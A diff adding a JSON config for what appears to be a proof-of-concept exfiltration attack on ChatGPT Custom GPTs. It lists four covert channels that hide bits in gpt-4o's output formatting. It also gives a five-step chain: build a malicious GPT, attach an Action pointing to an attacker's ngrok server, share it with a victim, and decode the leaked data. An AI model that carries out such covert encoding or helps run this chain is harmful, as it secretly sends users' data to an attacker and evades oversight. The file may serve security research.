@@ -1,0 +1,23 @@
+{
+  "payload": "EXFIL",
+  "model": "gpt-4o",
+  "channels": [
+    "CCE",
+    "CASE",
+    "PUNC",
+    "SECS"
+  ],
+  "expected_bits": {
+    "CCE": 0,
+    "CASE": 1,
+    "PUNC": 0,
+    "SECS": 0
+  },
+  "attack_chain": [
+    "1. Create Custom GPT with gpt_instructions.txt",
+    "2. Add Action from action_schema.json (point to your ngrok URL)",
+    "3. Share GPT link with victim",
+    "4. Run: python exfil_server.py --model gpt-4o",
+    "5. Watch decoded data arrive automatically"
+  ]
+}
